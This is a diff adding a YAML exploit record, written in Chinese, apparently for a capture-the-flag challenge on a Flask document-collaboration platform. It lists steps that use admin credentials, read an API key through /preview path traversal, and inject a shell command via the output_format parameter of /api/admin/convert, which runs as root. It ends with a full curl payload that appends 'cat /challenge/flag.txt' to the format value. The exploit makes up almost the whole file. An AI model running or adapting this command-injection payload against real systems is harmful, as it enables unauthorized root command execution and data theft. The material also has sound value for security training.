@@ -1,0 +1,24 @@
+info:
+  name: flask-converter-command-injection
+  cve: ''
+  summary: Flask 文档协作平台：/api/admin/convert 接口 output_format 参数命令注入（converter 服务以 root
+    执行），配合 /preview 路径遍历读源码
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: Flask 文档协作平台：/api/admin/convert 接口 output_format 参数命令注入（converter 服务以
+    root 执行），配合 /preview 路径遍历读源码
+  steps:
+  - 1. 登录（GET /login 拿 cookie，POST /login 表单 username/password）
+  - 2. 用管理员 sysadmin/docpass 登录进入 /admin
+  - 3. 从 /admin 页面 JS 发现 /api/admin/convert 接口
+  - 4. 接口需 X-API-Key 头（从 /app/config/settings.py 读取，或通过 /preview 路径遍历读 app.py 得知 key）
+  - 5. output_format 参数存在命令注入（converter 服务以 root 执行 shell）
+  - 6. 执行 cat /challenge/flag.txt 读 flag
+  payload: 'curl -s -b <cookie> -X POST "http://TARGET/api/admin/convert" -H "X-API-Key:
+    docplatform_service_key_4k8x2m9w" --data-urlencode "input_file=test.txt" --data-urlencode
+    "output_format=pdf;cat /challenge/flag.txt 2>&1"'
+  verification: Flask 文档协作平台：/api/admin/convert 接口 output_format 参数命令注入（converter
+    服务以 root 执行），配合 /preview 路径遍历读源码
